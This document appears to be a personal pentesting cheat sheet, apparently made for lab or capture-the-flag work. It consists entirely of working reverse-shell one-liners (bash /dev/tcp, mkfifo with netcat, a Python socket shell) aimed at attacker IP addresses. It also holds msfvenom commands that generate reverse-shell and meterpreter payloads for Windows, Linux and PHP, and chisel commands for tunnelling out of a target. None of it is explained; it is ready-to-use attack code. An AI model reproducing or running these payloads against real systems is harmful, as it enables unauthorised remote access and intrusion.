##### windows - linux - specific languages shells


##### links
- [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

 ###### reverse shells
```bash
# bash-1
bash -i >& /dev/tcp/10.8.129.32/433 0>&1
# bash-2
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.129.32 4444 >/tmp/f
# python-1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.2.6",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

```
- msfvenom generate
```bash
# stageless reverse shells windows
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.129.32 LPORT=4444 -f exe > shell-x86.exe
# stageless reverse shells linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.129.32 LPORT=4444 -f elf > shell-x86.elf
# staged meterpreter windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.129.32 LPORT=4444 -f exe > shell-x86.exe
# php
msfvenom -p php/reverse_php LHOST=10.10.14.7 LPORT=4444 -f raw > shell.php
```

- starting chisel
```bash
# start server on local
./chisel server --reverse -p 8000
# start client on target
./chisel client 10.10.14.7:8000 R:3306:127.0.0.1:3306
```